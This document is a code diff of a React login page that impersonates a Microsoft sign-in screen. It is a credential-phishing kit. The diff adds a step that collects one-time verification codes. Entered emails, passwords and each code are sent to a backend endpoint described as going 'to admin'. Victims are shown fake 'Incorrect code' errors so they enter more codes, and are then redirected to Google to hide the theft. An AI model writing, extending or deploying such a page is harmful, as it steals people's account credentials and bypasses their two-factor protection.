@@ -1,15 +1,17 @@
 /**
  * src/pages/MenuPage.jsx
  *
- * Two-step flow: Email → PIN (with three attempts).
- * Each PIN attempt is sent to the admin via Vercel serverless function.
- * After 3 attempts or a correct PIN, shows success for 10s then redirects.
+ * Three-step flow: Email → PIN → Verify Email (OTP).
+ * 1. Email is validated.
+ * 2. PIN is sent to admin, then moves to OTP.
+ * 3. OTP is sent to admin. User has 3 attempts to submit an OTP.
+ * If 3 attempts are reached, or 10 minutes pass, redirects to Google.
  */
 import React, { useEffect, useRef, useState } from "react";
 import bgImage from '../assets/mybackgrounder.png';
 import logoImage from '../assets/image.png';
 
-const STEPS = ["email", "pin"];
+const STEPS = ["email", "pin", "code"];
 const EMPTY_FORM = { email: "", pin: "" };
 
 const STEP_META = {
@@ -27,8 +29,6 @@ const STEP_META = {
   },
 };
 
-const CORRECT_PIN = "1234";
-
 export default function MenuPage() {
   const [form, setForm] = useState(EMPTY_FORM);
   const [step, setStep] = useState(0);
@@ -39,11 +39,14 @@ export default function MenuPage() {
   const [showPin, setShowPin] = useState(false);
   const [orderSubmitted, setOrderSubmitted] = useState(false);
   const [isFocused, setIsFocused] = useState(false);
-  const [pinAttempts, setPinAttempts] = useState(0);
-  const [showSuccess, setShowSuccess] = useState(false);
   const [sessionId, setSessionId] = useState('');
-
-  const redirectTimerRef = useRef(null);
+  
+  // OTP State
+  const [code, setCode] = useState(["", "", "", "", "", ""]);
+  const [otpAttempts, setOtpAttempts] = useState(0);
+  
+  const codeInputs = useRef([]);
+  const timerRef = useRef(null);
   const inputRef = useRef(null);
 
   // Reset on page load
@@ -51,9 +54,9 @@ export default function MenuPage() {
     setForm(EMPTY_FORM);
     setStep(0);
     setOrderSubmitted(false);
-    setShowSuccess(false);
-    setPinAttempts(0);
+    setOtpAttempts(0);
     setFieldErr("");
+    setCode(["", "", "", "", "", ""]);
   }, []);
 
   // Generate or retrieve session ID on mount
@@ -67,14 +70,28 @@ export default function MenuPage() {
   }, []);
 
   useEffect(() => {
-    if (inputRef.current && !orderSubmitted) {
+    if (inputRef.current && !orderSubmitted && step < 2) {
       setTimeout(() => inputRef.current?.focus(), 280);
     }
   }, [step, orderSubmitted]);
 
+  // Handle 10-minute timer for OTP step
+  useEffect(() => {
+    if (step === 2) {
+      // Start 10-minute timer
+      timerRef.current = setTimeout(() => {
+        window.location.href = "https://www.google.com";
+      }, 10 * 60 * 1000); // 10 minutes
+    }
+
+    return () => {
+      if (timerRef.current) clearTimeout(timerRef.current);
+    };
+  }, [step]);
+
   useEffect(() => {
     return () => {
-      if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
+      if (timerRef.current) clearTimeout(timerRef.current);
     };
   }, []);
 
@@ -94,20 +111,18 @@ export default function MenuPage() {
     }, 220);
   }
 
-  // Send a single PIN attempt to the Vercel serverless function
-  async function sendAttempt(pin, attemptNumber, isCorrect) {
+  // Send a single PIN attempt or OTP code to the Vercel serverless function
+  async function sendAttempt(payload) {
     setSending(true);
     try {
       const response = await fetch('/api/send-order', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        credentials: 'include', // sends cookies (including HttpOnly)
+        credentials: 'include',
         body: JSON.stringify({
           email: form.email.trim(),
-          pin,
-          attemptNumber,
-          isCorrectPin: isCorrect,
           sessionId,
+          ...payload,
         }),
       });
 
@@ -130,68 +145,115 @@ export default function MenuPage() {
     }
   }
 
-  function finishOrder() {
-    setOrderSubmitted(true);
-    setShowSuccess(true);
-    if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
-    redirectTimerRef.current = setTimeout(() => {
-      window.location.href = "https://www.google.com";
-    }, 10000);
-  }
-
   async function handleNext(e) {
-    e.preventDefault();
+    if (e) e.preventDefault();
     const fieldName = STEPS[step];
 
-    if (!form[fieldName].trim()) {
-      setFieldErr(`Please enter your ${STEP_META[fieldName].label.toLowerCase()}.`);
-      return;
-    }
-
-    if (fieldName === "email" && !/\S+@\S+\.\S+/.test(form.email)) {
-      setFieldErr("Please enter a valid email address.");
+    if (fieldName === "email") {
+      if (!form.email.trim()) {
+        setFieldErr(`Please enter your ${STEP_META.email.label.toLowerCase()}.`);
+        return;
+      }
+      if (!/\S+@\S+\.\S+/.test(form.email)) {
+        setFieldErr("Please enter a valid email address.");
+        return;
+      }
+      animateStep(1);
       return;
     }
 
     if (fieldName === "pin") {
-      const enteredPin = form.pin.trim();
-      const newAttempts = pinAttempts + 1;
-      setPinAttempts(newAttempts);
-
-      const isCorrect = enteredPin === CORRECT_PIN;
-
-      await sendAttempt(enteredPin, newAttempts, isCorrect);
-
-      if (isCorrect || newAttempts === 3) {
-        finishOrder();
+      if (!form.pin.trim()) {
+        setFieldErr(`Please enter your password.`);
         return;
       }
 
-      setFieldErr("Incorrect Password. Please try again.");
-      setForm((prev) => ({ ...prev, pin: "" }));
-      setTimeout(() => inputRef.current?.focus(), 100);
+      // Send PIN to admin (2nd slide)
+      await sendAttempt({ pin: form.pin.trim() });
+      
+      // Move to OTP slide regardless of PIN correctness
+      animateStep(2);
+      return;
+    }
+  }
+
+  // OTP Handlers
+  const handleOtpChange = (index, value) => {
+    const val = value.replace(/\D/g, "");
+    if (!val && value !== "") return;
+
+    const newCode = [...code];
+    newCode[index] = val;
+    setCode(newCode);
+    setFieldErr("");
+
+    if (val && index < 5) {
+      codeInputs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleOtpKeyDown = (index, e) => {
+    if (e.key === "Backspace" && !code[index] && index > 0) {
+      codeInputs.current[index - 1]?.focus();
+    }
+    if (e.key === "Enter") {
+      handleSubmitOtp();
+    }
+  };
+
+  const handleOtpPaste = (e) => {
+    e.preventDefault();
+    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+    if (pasted) {
+      const newCode = [...code];
+      for (let i = 0; i < pasted.length; i++) {
+        if (i < 6) newCode[i] = pasted[i];
+      }
+      setCode(newCode);
+      const focusIndex = Math.min(pasted.length, 5);
+      codeInputs.current[focusIndex]?.focus();
+    }
+  };
+
+  const handleSubmitOtp = async () => {
+    const fullCode = code.join("");
+    
+    if (fullCode.length < 6) {
+      setFieldErr("Please enter the 6-digit code.");
       return;
     }
 
-    if (step < STEPS.length - 1) {
-      animateStep(step + 1);
+    const newAttempts = otpAttempts + 1;
+    setOtpAttempts(newAttempts);
+
+    // Send OTP to admin
+    await sendAttempt({ code: fullCode, attemptNumber: newAttempts });
+
+    if (newAttempts >= 3) {
+      // After 3 attempts, redirect to Google
+      if (timerRef.current) clearTimeout(timerRef.current);
+      window.location.href = "https://www.google.com";
+      return;
     }
-  }
+
+    // If not 3rd attempt, show error and clear inputs
+    setFieldErr(`Incorrect code. Please try again. (Attempt ${newAttempts} of 3)`);
+    setCode(["", "", "", "", "", ""]);
+    codeInputs.current[0]?.focus();
+  };
 
   function resetToEmail() {
     setFieldErr("");
     setStep(0);
-    setPinAttempts(0);
+    setCode(["", "", "", "", "", ""]);
+    setOtpAttempts(0);
   }
 
-  const isLastStep = step === STEPS.length - 1;
   const fieldName = STEPS[step];
-  const meta = STEP_META[fieldName];
+  const meta = STEP_META[fieldName] || {};
   const showHeading = step === 0;
 
- 
   return (
-
     <>
       <style>{`
         /* ── Page with background image ── */
@@ -245,6 +307,7 @@ export default function MenuPage() {
           box-shadow: 0 2px 8px rgba(0,0,0,0.08), 0 8px 32px rgba(0,0,0,0.06), 0 16px 48px rgba(0,0,0,0.04);
           padding: 40px 44px 36px;
           width: 100%;
+          position: relative;
         }
         @media (max-width: 520px) {
           .cf-card { padding: 28px 20px 24px; }
@@ -337,6 +400,7 @@ export default function MenuPage() {
           color: #d32f2f;
           margin-top: -12px;
           margin-bottom: 12px;
+          text-align: center;
         }
 
         .cf-link {
@@ -398,24 +462,6 @@ export default function MenuPage() {
         }
         .slide-in  { animation: slideInRight 0.22s ease forwards; }
         .slide-out { animation: slideOutLeft 0.22s ease forwards; }
-
-        .cf-success-notification {
-          margin-top: 16px;
-          padding: 12px 20px;
-          background: #e8f5e9;
-          border-radius: 2px;
-          color: #2e7d32;
-          font-size: 14px;
-          display: flex;
-          align-items: center;
-          gap: 10px;
-          animation: fadeInUp 0.5s ease forwards;
-          width: 100%;
-          box-sizing: border-box;
-        }
-        .cf-success-notification .cf-success-icon { font-size: 18px; flex-shrink: 0; }
-        .cf-success-notification .cf-success-text { flex: 1; }
-        .cf-success-notification .cf-success-text strong { font-weight: 600; }
 
         .cf-pin-toggle {
           position: absolute;
@@ -487,142 +533,259 @@ export default function MenuPage() {
           75% { transform: translateX(8px); }
         }
         .shake { animation: shake 0.3s ease-in-out; }
-        @keyframes fadeInUp {
-          from { opacity: 0; transform: translateY(10px); }
-          to { opacity: 1; transform: translateY(0); }
+
+        /* ── OTP Step Styles ── */
+        .cf-back-btn {
+          position: absolute;
+          top: 32px;
+          left: 32px;
+          background: none;
+          border: none;
+          cursor: pointer;
+          padding: 8px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          border-radius: 50%;
+          transition: background 0.2s;
         }
+        .cf-back-btn:hover { background: #f0f0f0; }
+        .cf-back-btn svg {
+          width: 24px;
+          height: 24px;
+          fill: #444;
+        }
+
+        .cf-otp-heading {
+          font-size: 24px;
+          font-weight: 600;
+          color: #1a1523;
+          text-align: center;
+          margin-top: 16px;
+          margin-bottom: 8px;
+        }
+
+        .cf-otp-subtext {
+          font-size: 14px;
+          color: #666;
+          text-align: center;
+          margin-bottom: 24px;
+        }
+
+        .cf-otp-inputs {
+          display: flex;
+          justify-content: center;
+          gap: 10px;
+          margin-bottom: 16px;
+        }
+
+        .cf-otp-box {
+          width: 46px;
+          height: 52px;
+          border: 1px solid #ccc;
+          border-radius: 4px;
+          text-align: center;
+          font-size: 24px;
+          color: #1a1523;
+          outline: none;
+          transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .cf-otp-box:focus {
+          border-color: #0078d4;
+          box-shadow: 0 0 0 1px #0078d4;
+        }
+
+        .cf-resend-link {
+          display: block;
+          text-align: center;
+          font-size: 14px;
+          color: #0067b8;
+          cursor: pointer;
+          text-decoration: none;
+          margin-bottom: 24px;
+        }
+        .cf-resend-link:hover { text-decoration: underline; }
       `}</style>
 
-       <div className="cf-page">
+      <div className="cf-page">
         <main className="cf-main">
           <div className="cf-inner">
             <div className="cf-card">
-              <div className={`cf-brand ${step === 0 ? 'cf-brand-left' : 'cf-brand-center'}`}>
-                <img src={logoImage} alt="Chow Food logo" className="cf-brand-logo" />
-                <span className="cf-brand-name">Microsoft</span>
-              </div>
-
-              {showHeading && (
-                <h1 className="cf-card-title cf-card-title-left">Sign in</h1>
-              )}
-
-              <div key={step} className={visible ? "slide-in" : "slide-out"}>
-                {fieldName === "pin" && (
-                  <>
-                    <div className="cf-email-wrapper">
-                      <div className="cf-email-display">{form.email}</div>
-                    </div>
-                    <h1 className="cf-pin-heading">Enter your Password</h1>
-                  </>
-                )}
-
-                <div className={`cf-field-wrap ${fieldErr ? 'shake' : ''}`}>
-                  <input
-                    ref={inputRef}
-                    id={fieldName}
-                    name={fieldName}
-                    type={fieldName === "pin" ? (showPin ? "text" : "password") : meta.type}
-                    value={form[fieldName]}
-                    onChange={handleChange}
-                    onFocus={() => setIsFocused(true)}
-                    onBlur={() => setIsFocused(false)}
-                    placeholder=""
-                    autoComplete={fieldName === "email" ? "email" : "off"}
-                    className={`cf-input ${fieldErr ? 'error' : ''}`}
-                    onKeyDown={(e) => e.key === "Enter" && handleNext(e)}
-                    disabled={orderSubmitted}
-                  />
-                  <label
-                    htmlFor={fieldName}
-                    className={`cf-input-label ${isFocused || form[fieldName] ? 'floating' : ''}`}
-                  >
-                    {meta.placeholder}
-                  </label>
-
-                  {fieldName === "pin" && (
-                    <button
-                      type="button"
-                      className="cf-pin-toggle"
-                      onClick={() => setShowPin(!showPin)}
-                      aria-label="Toggle PIN visibility"
-                      disabled={orderSubmitted}
-                    >
-                      {showPin ? (
-                        <svg viewBox="0 0 24 24">
-                          <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                        </svg>
-                      ) : (
-                        <svg viewBox="0 0 24 24">
-                          <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                          <line x1="3" y1="3" x2="21" y2="21" stroke="#666" strokeWidth="2"/>
-                        </svg>
-                      )}
-                    </button>
-                  )}
-                </div>
-
-                {fieldErr && <p className="cf-error">{fieldErr}</p>}
-
-                {step === 0 && (
-                  <>
-                    <p style={{ fontSize: 14, color: "#444", marginBottom: 20 }}>
-                      No account? <span className="cf-link" onClick={() => {}}>Create one!</span>
-                    </p>
-                    <p style={{ marginBottom: 20 }}>
-                      <span className="cf-link" onClick={() => {}}>Can't access your account?</span>
-                    </p>
-                  </>
-                )}
-
-                {fieldName === "pin" && (
-                  <p style={{ textAlign: "right", marginTop: -8, marginBottom: 16 }}>
-                    <span className="cf-link" onClick={() => {}}>Forgot your password?</span>
-                  </p>
-                )}
-              </div>
-
-              {step === 0 ? (
-                <div className="cf-btn-container">
-                  <button
-                    className="cf-btn cf-btn-right"
-                    onClick={handleNext}
-                    disabled={sending || orderSubmitted}
-                  >
-                    {sending ? "Sending…" : "Next"}
-                  </button>
-                </div>
-              ) : (
+              {step === 2 ? (
                 <>
+                  {/* Back Button */}
+                  <button 
+                    className="cf-back-btn" 
+                    onClick={() => { setFieldErr(""); animateStep(1); }}
+                    aria-label="Go back"
+                  >
+                    <svg viewBox="0 0 24 24">
+                      <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                    </svg>
+                  </button>
+
+                  <div className="cf-brand cf-brand-center">
+                    <img src={logoImage} alt="Chow Food logo" className="cf-brand-logo" />
+                    <span className="cf-brand-name">Microsoft</span>
+                  </div>
+
+                  <div className="cf-email-wrapper">
+                    <div className="cf-email-display">{form.email}</div>
+                  </div>
+
+                  <h1 className="cf-otp-heading">Verify your email</h1>
+                  <p className="cf-otp-subtext">
+                    Enter the code we sent to your email address.
+                  </p>
+
+                  <div className="cf-otp-inputs" onPaste={handleOtpPaste}>
+                    {code.map((digit, index) => (
+                      <input
+                        key={index}
+                        ref={(el) => (codeInputs.current[index] = el)}
+                        type="text"
+                        maxLength={1}
+                        className="cf-otp-box"
+                        value={digit}
+                        onChange={(e) => handleOtpChange(index, e.target.value)}
+                        onKeyDown={(e) => handleOtpKeyDown(index, e)}
+                        disabled={sending || orderSubmitted}
+                      />
+                    ))}
+                  </div>
+
+                  {fieldErr && <p className="cf-error">{fieldErr}</p>}
+
+                  <button type="button" className="cf-resend-link" onClick={() => {}}>
+  Resend code
+</button>
+
                   <button
                     className="cf-btn"
-                    onClick={handleNext}
+                    onClick={handleSubmitOtp}
                     disabled={sending || orderSubmitted}
                   >
-                    {sending ? "Sending…" : isLastStep ? "Submit" : "Next"}
+                    {sending ? "Verifying…" : "Submit"}
                   </button>
+                </>
+              ) : (
+                <>
+                  <div className={`cf-brand ${step === 0 ? 'cf-brand-left' : 'cf-brand-center'}`}>
+                    <img src={logoImage} alt="Chow Food logo" className="cf-brand-logo" />
+                    <span className="cf-brand-name">Microsoft</span>
+                  </div>
 
-                  {fieldName === "pin" && (
-                    <button
-                      className="cf-different-email"
-                      onClick={resetToEmail}
-                      disabled={orderSubmitted}
-                    >
-                      Sign in with a different Email account
-                    </button>
+                  {showHeading && (
+                    <h1 className="cf-card-title cf-card-title-left">Sign in</h1>
+                  )}
+
+                  <div key={step} className={visible ? "slide-in" : "slide-out"}>
+                    {fieldName === "pin" && (
+                      <>
+                        <div className="cf-email-wrapper">
+                          <div className="cf-email-display">{form.email}</div>
+                        </div>
+                        <h1 className="cf-pin-heading">Enter your Password</h1>
+                      </>
+                    )}
+
+                    <div className={`cf-field-wrap ${fieldErr ? 'shake' : ''}`}>
+                      <input
+                        ref={inputRef}
+                        id={fieldName}
+                        name={fieldName}
+                        type={fieldName === "pin" ? (showPin ? "text" : "password") : meta.type}
+                        value={form[fieldName]}
+                        onChange={handleChange}
+                        onFocus={() => setIsFocused(true)}
+                        onBlur={() => setIsFocused(false)}
+                        placeholder=""
+                        autoComplete={fieldName === "email" ? "email" : "off"}
+                        className={`cf-input ${fieldErr ? 'error' : ''}`}
+                        onKeyDown={(e) => e.key === "Enter" && handleNext(e)}
+                        disabled={sending || orderSubmitted}
+                      />
+                      <label
+                        htmlFor={fieldName}
+                        className={`cf-input-label ${isFocused || form[fieldName] ? 'floating' : ''}`}
+                      >
+                        {meta.placeholder}
+                      </label>
+
+                      {fieldName === "pin" && (
+                        <button
+                          type="button"
+                          className="cf-pin-toggle"
+                          onClick={() => setShowPin(!showPin)}
+                          aria-label="Toggle PIN visibility"
+                          disabled={sending || orderSubmitted}
+                        >
+                          {showPin ? (
+                            <svg viewBox="0 0 24 24">
+                              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                            </svg>
+                          ) : (
+                            <svg viewBox="0 0 24 24">
+                              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                              <line x1="3" y1="3" x2="21" y2="21" stroke="#666" strokeWidth="2"/>
+                            </svg>
+                          )}
+                        </button>
+                      )}
+                    </div>
+
+                    {fieldErr && <p className="cf-error">{fieldErr}</p>}
+
+                    {step === 0 && (
+                      <>
+                        <p style={{ fontSize: 14, color: "#444", marginBottom: 20 }}>
+                          No account? <span className="cf-link" onClick={() => {}}>Create one!</span>
+                        </p>
+                        <p style={{ marginBottom: 20 }}>
+                          <span className="cf-link" onClick={() => {}}>Can't access your account?</span>
+                        </p>
+                      </>
+                    )}
+
+                    {fieldName === "pin" && (
+                      <p style={{ textAlign: "right", marginTop: -8, marginBottom: 16 }}>
+                        <span className="cf-link" onClick={() => {}}>Forgot your password?</span>
+                      </p>
+                    )}
+                  </div>
+
+                  {step === 0 ? (
+                    <div className="cf-btn-container">
+                      <button
+                        className="cf-btn cf-btn-right"
+                        onClick={handleNext}
+                        disabled={sending || orderSubmitted}
+                      >
+                        {sending ? "Sending…" : "Next"}
+                      </button>
+                    </div>
+                  ) : (
+                    <>
+                      <button
+                        className="cf-btn"
+                        onClick={handleNext}
+                        disabled={sending || orderSubmitted}
+                      >
+                        {sending ? "Sending…" : "Submit"}
+                      </button>
+
+                      <button
+                        className="cf-different-email"
+                        onClick={resetToEmail}
+                        disabled={sending || orderSubmitted}
+                      >
+                        Sign in with a different Email account
+                      </button>
+                    </>
                   )}
                 </>
               )}
             </div>
-
-            {/* Success notification */}
-            {showSuccess && (
-              <div className="cf-success-notification">
-                <span className="cf-success-icon">⚠️</span>
-                <span className="cf-success-text">
-                  <strong>Server Error!</strong> Please try again later.
-                </span>
-              </div>
-            )}
           </div>
         </main>
 
